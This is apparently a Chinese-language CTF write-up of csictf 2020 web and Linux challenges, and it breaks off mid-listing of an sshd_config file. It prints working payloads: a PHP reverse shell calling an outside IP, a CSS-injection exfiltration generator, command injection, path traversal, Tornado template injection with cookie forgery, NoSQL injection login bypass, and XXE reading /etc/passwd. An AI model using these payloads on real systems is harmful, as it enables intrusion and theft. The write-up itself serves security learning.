<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;wc <span class="keyword">as</span> a service&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;password&#x27;</span>] !== getenv(<span class="string">&#x27;PASSWORD&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;PASSWORD&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry, only people from csivit are allowed to access this page.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Character Count <span class="keyword">as</span> a Service&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;wc.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> rows=<span class="number">30</span> cols=<span class="number">100</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;text&quot;</span>])) &#123;</span><br><span class="line">        $text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Character Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $text . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>把cookie中的password改成<code>w0rdc0unt123</code>，就可以输入text了</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727152049.png" style="zoom:50%;" />
<p>来看一下后端的处理逻辑：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;text&quot;</span>])) &#123;</span><br><span class="line">        $text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Character Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $text . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显<code>$text</code>参数是可以注入的。payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;; whoami #</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727154945.png" style="zoom:50%;" />
<p>反弹一个shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;; php -r &#39;$sock&#x3D;fsockopen(&quot;47.97.199.89&quot;,11000);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; #</span><br></pre></td></tr></table></figure>
<p>全局查找一下flag文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727164827.png" alt=""></p>
<p><code>/ctf/system/of/a/down/flag.txt</code>显示权限不够</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165244.png" alt=""></p>
<p>README里面有一段Hash加密的值，送到工具里面去识别是MD5加密，放到网上去跑没有拍出来，看其他的wp是csictf</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165431.png" alt=""></p>
<p>切换成ctf用户</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165639.png" alt=""></p>
<h3 id="The-Confused-Deputy">The Confused Deputy</h3>
<p><strong>考察CSS注入</strong></p>
<p>脚本生成payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&quot;poc.css&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;#000000;&#125; input[type=password][value^=&quot;&#x27;&#x27;&#x27;</span> + i + <span class="string">&#x27;&#x27;&#x27;&quot;]&#123;background-image:url(&quot;http://47.97.199.89:8888/?flag=&#x27;&#x27;&#x27;</span> + i + <span class="string">&#x27;&#x27;&#x27;&quot;);&#125; &#x27;&#x27;&#x27;</span></span><br><span class="line">    f.write(payload + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>放到burp intrude模块爆破</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200729165300.png" style="zoom: 67%;" />
<p>在VPS上监听端口</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200729165431.png" alt=""></p>
<p>逐次爆破各个位置得到flag。</p>
<h3 id="File-Library">File Library</h3>
<p>题目直接给了源代码server.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = process.env.PORT || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Listening on port <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/getFile&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; file &#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        res.send(<span class="string">`file=<span class="subst">$&#123;file&#125;</span>\nFilename not specified!`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file.includes(<span class="string">&#x27; &#x27;</span>) || file.includes(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            res.send(<span class="string">`file=<span class="subst">$&#123;file&#125;</span>\nInvalid filename!`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!allowedFileType(file)) &#123;</span><br><span class="line">        res.send(<span class="string">`File type not allowed`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        file = file.slice(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> returnedFile = path.resolve(__dirname + <span class="string">&#x27;/&#x27;</span> + file);</span><br><span class="line"></span><br><span class="line">    fs.readFile(returnedFile, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">if</span> (err.code != <span class="string">&#x27;ENOENT&#x27;</span>) <span class="built_in">console</span>.log(err);</span><br><span class="line">            res.send(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.sendFile(returnedFile);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allowedFileType</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> format = file.slice(file.indexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format == <span class="string">&#x27;js&#x27;</span> || format == <span class="string">&#x27;ts&#x27;</span> || format == <span class="string">&#x27;c&#x27;</span> || format == <span class="string">&#x27;cpp&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面内还给了两个提示：</p>
<p>ok.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Welcome to my sample javascript program!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Let&#x27;s checkout some funny issues in JS!</span></span><br><span class="line"></span><br><span class="line">[] == ![]; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> == []; <span class="comment">// -&gt; true</span></span><br><span class="line"><span class="literal">false</span> == ![]; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;b&quot;</span> + <span class="string">&quot;a&quot;</span> + +<span class="string">&quot;a&quot;</span> + <span class="string">&quot;a&quot;</span>); <span class="comment">// -&gt; baNaNa</span></span><br><span class="line"></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span>; <span class="comment">// -&gt; false</span></span><br><span class="line"></span><br><span class="line">(![] + [])[+[]] +</span><br><span class="line">  (![] + [])[+!+[]] +</span><br><span class="line">  ([![]] + [][[]])[+!+[] + [+[]]] +</span><br><span class="line">  (![] + [])[!+[] + !+[]];</span><br><span class="line"><span class="comment">// -&gt; &#x27;fail&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.all <span class="keyword">instanceof</span> <span class="built_in">Object</span>; <span class="comment">// -&gt; true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">document</span>.all; <span class="comment">// -&gt; &#x27;undefined&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MIN_VALUE &gt; <span class="number">0</span>; <span class="comment">// -&gt; true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] + [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]; <span class="comment">// -&gt; &#x27;1,2,34,5,6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;View more: https://github.com/denysdovhan/wtfjs&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>a.cpp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>应该就是尝试利用server.js读取flag.txt。</p>
<p>审计源代码，主要是由两个关键的处理：</p>
<p>文件类型必须是<code>js, ts, c, cpp</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!allowedFileType(file)) &#123;</span><br><span class="line">        res.send(<span class="string">`File type not allowed`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>取文件名的前五位</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        file = file.slice(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后用<code>path.resolve</code>拼接成最终路径。</p>
<p>payload就直接给出来了，反正我是没想到的。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getFile?file[]&#x3D;f&amp;file[]&#x3D;4&amp;file[]&#x3D;k&amp;file[]&#x3D;e&amp;file[]&#x3D;&#x2F;..&#x2F;flag.txt&amp;file[]&#x3D;.&amp;file[]&#x3D;js</span><br></pre></td></tr></table></figure>
<p>利用数组来绕过，node.js会解析成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file[] &#x3D; [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;&#x2F;..&#x2F;flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</span><br></pre></td></tr></table></figure>
<p>这样就可以绕过后缀名和文件长度的检查。</p>
<p>这里还利用了<code>path.resolve</code>的一个特性</p>
<blockquote>
<p>The method creates absolute path from right to left until an absolute path is constructed</p>
<p>该方法从右到左创建绝对路径，直到构造了绝对路径。</p>
</blockquote>
<p>也就是执行完下面的语句</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> returnedFile = path.resolve(__dirname + <span class="string">&#x27;/&#x27;</span> + [<span class="string">&quot;f&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;/../flag.txt&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>结果就是<code>__dirname+'/'+'/../flag.txt'</code></p>
<h3 id="The-Usual-Suspects">The Usual Suspects</h3>
<p><strong>考察tornado模板注入+生成cookie secret</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211245.png" alt=""></p>
<p>很明显存在模板注入漏洞，用<code>&#123;&#123;7*'7'&#125;&#125;</code>验证一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211407.png" alt=""></p>
<p>查看当前网页的cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;2|1:0|10:1595941408|5:admin|8:ZmFsc2U&#x3D;|bfe7af9eba0d5c6717c341e50fd8660db4e4fccbce187a20c1236205df3e3171&quot;</span><br></pre></td></tr></table></figure>
<p><code>ZmFsc2U=</code>是<code>false</code>的base64编码</p>
<p>题目提示要拿secret，用<code>&#123;&#123;config&#125;&#125;</code>直接报错</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211530.png" alt=""></p>
<p>Google一下tornado cookie secret</p>
<blockquote>
<p><a href="https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings">https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728212313.png" alt=""></p>
<p>用<code>global()</code>查看当前全局变量</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728211912.png" alt=""></p>
<p>用<code>application.settings</code>获取cookie_secret</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728212416.png" alt=""></p>
<p>用脚本生成tornado cookies</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> (</span><br><span class="line">	Dict,</span><br><span class="line">	Any,</span><br><span class="line">	Union,</span><br><span class="line">	Optional,</span><br><span class="line">	Awaitable,</span><br><span class="line">	Tuple,</span><br><span class="line">	List,</span><br><span class="line">	Callable,</span><br><span class="line">	Iterable,</span><br><span class="line">	Generator,</span><br><span class="line">	Type,</span><br><span class="line">	cast,</span><br><span class="line">	overload,</span><br><span class="line">)</span><br><span class="line">_UTF8_TYPES = (bytes, type(<span class="literal">None</span>))</span><br><span class="line">unicode_type = str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">utf8</span>(<span class="params">value: Union[None, str, bytes]</span>) -&gt; Optional[bytes]:</span>  <span class="comment"># noqa: F811</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Converts a string argument to a byte string.</span></span><br><span class="line"><span class="string">    If the argument is already a byte string or None, it is returned unchanged.</span></span><br><span class="line"><span class="string">    Otherwise it must be a unicode string and is encoded as utf8.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, _UTF8_TYPES):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, unicode_type):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;Expected bytes, unicode, or None; got %r&quot;</span> % type(value))</span><br><span class="line">    <span class="keyword">return</span> value.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create_signature_v2</span>(<span class="params">secret: Union[str, bytes], s: bytes</span>) -&gt; bytes:</span></span><br><span class="line">	hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)</span><br><span class="line">	hash.update(utf8(s))</span><br><span class="line">	<span class="keyword">return</span> utf8(hash.hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_field</span>(<span class="params">s: Union[str, bytes]</span>) -&gt; bytes:</span></span><br><span class="line">	<span class="keyword">return</span> utf8(<span class="string">&quot;%d:&quot;</span> % len(s)) + utf8(s)</span><br><span class="line"></span><br><span class="line">to_sign = <span class="string">b&quot;|&quot;</span>.join(</span><br><span class="line">			[</span><br><span class="line">				<span class="string">b&quot;2&quot;</span>,</span><br><span class="line">				format_field(<span class="string">&quot;0&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;1595249713&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;admin&quot;</span>),</span><br><span class="line">				format_field(<span class="string">&quot;dHJ1ZQ==&quot;</span>),</span><br><span class="line">				<span class="string">b&quot;&quot;</span>,</span><br><span class="line">			]</span><br><span class="line">		)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(to_sign + _create_signature_v2(<span class="string">&#x27;MangoDB\n&#x27;</span>,to_sign))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728213202.png" alt=""></p>
<p>用这个更换原始的cookie，拿到flag。</p>
<h3 id="CCC">CCC</h3>
<p><strong>考察文件包含+JWT</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728170643.png" alt=""></p>
<p>在右侧菜单栏中<code>Our Admins</code>和<code>Login</code>不能直接点开，但是通过源代码可以看到链接了两个地址：<code>/adminNames</code>和<code>/login</code>。</p>
<p>访问<code>/adminNames</code>直接下载了一个文件，里面是一个github仓库地址：<a href="https://github.com/csivitu/authorized_users/blob/master">https://github.com/csivitu/authorized_users/blob/master</a></p>
<p>访问<code>/login</code>是一个登录界面，随便输入<code>admin:admin</code>，返回包中有一个JWT token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728171934.png" alt=""></p>
<p>拿到jwt.io解码一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;nqzva&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;nqzva&quot;,</span><br><span class="line">  &quot;admin&quot;: &quot;snyfr&quot;,</span><br><span class="line">  &quot;iat&quot;: 1595922746</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>nqzva</code>用ROT13解密得到<code>admin</code>，<code>snyfr</code>用ROT13解密得到<code>flase</code>，并且不管输入什么用户名和密码，都是相同的token，那么现在就需要拿到secret。</p>
<p>回头再来看<code>/adminNames</code>，发现了一个文件包含</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728172911.png" alt=""></p>
<p>那么久可以读取node.js的环境变量<code>../.env</code>，拿到secret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JWT_SECRET&#x3D;Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1</span><br></pre></td></tr></table></figure>
<p>生成token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728175724.png" alt=""></p>
<p>通过扫描目录得到<code>/admin</code>，访问返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;Invalid Token, Headers?&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>Authorization</code>字段发送请求包</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728175906.png" alt=""></p>
<p>ROT13解密得到flag。</p>
<h2 id="Linux">Linux</h2>
<h3 id="AKA">AKA</h3>
<p>大部分的命令都设置了alias，但是bash命令没有。</p>
<h3 id="find32">find32</h3>
<p>感觉这题脑洞还是挺大的。。</p>
<p>SSH登录后有很多文件，内容也是随机的字母，32在ASCII码中代表空格字符，那么在CTF的flag中就是<code>_</code>来代替。</p>
<p>写一个脚本传到靶机上去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/user1/&quot;</span>  </span><br><span class="line">files = os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(path+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                print(<span class="string">&#x27;[+]&#x27;</span> + path + file)</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                        print(file)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            print(<span class="string">&#x27;[-]&#x27;</span> + file)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727225538.png" alt=""></p>
<p>打开这个文件，提示要用user2来登录</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727225647.png" alt=""></p>
<p>ssh登录之后，当前目录下有几个文件，文件大小类似，用diff命令一个个比较一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727230952.png" alt=""></p>
<h3 id="HTB-0x01">HTB 0x01</h3>
<p>nmap扫描出5001端口运行ftp服务，直接anonymous登录拿flag。</p>
<h3 id="HTB-0x02-0x05">HTB 0x02~0x05</h3>
<p>nmap扫描端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp     open       ssh</span><br><span class="line">3000&#x2F;tcp   open       http</span><br></pre></td></tr></table></figure>
<p>先来看看3000端口，访问http://34.93.215.188:3000/，有一个登录框</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728103532.png" style="zoom: 67%;" />
<p>先用<code>1 or 1=1</code> , <code>1' or 1=1 --</code>，<code>';-#$()</code>来测试是不是SQL注入，结果直接返回<code>No user with username: ';-#$() and password: ';-#$()</code>。再用burp fuzz一下常用的payload发现是NoSQL注入，直接用万能密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$ne]&#x3D;ca01h&amp;password[$ne]&#x3D;ca01h</span><br></pre></td></tr></table></figure>
<blockquote>
<p>具体原理可以参考另外一篇博文：<a href="https://ca0y1h.top/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/">NoSQL注入之MongoDB</a></p>
</blockquote>
<p>登录成功后跳转到上传页面</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104417.png" alt=""></p>
<p>上传一个zip文件，再查看源代码，得到HTB 0x02的flag</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104529.png" alt=""></p>
<p>看到可以用不用的数据格式提交查询，有一个是XML，用下面的payload看看是否存在XXE注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728104913.png" alt=""></p>
<p>发现<code>/etc/passwd</code>暗藏一个gist地址：<a href="https://gist.github.com/sivel/c68f601137ef9063efd7">https://gist.github.com/sivel/c68f601137ef9063efd7</a></p>
<p>是一个管理SSH Key的工具，里面提到了两个文件，<code>/usr/local/bin/userkeys.sh</code>和<code>/etc/sshd/sshd_config</code>。分别用上面的XXE payload看一下文件内容</p>
<p><code>/etc/sshd/sshd_config</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This is the sshd server system-wide configuration file. See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># This sshd was compiled with PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented. Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">Include &#x2F;etc&#x2F;ssh&#x2F;sshd_config.d&#x2F;*.conf</span><br><span class="line"></span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">#HostKey 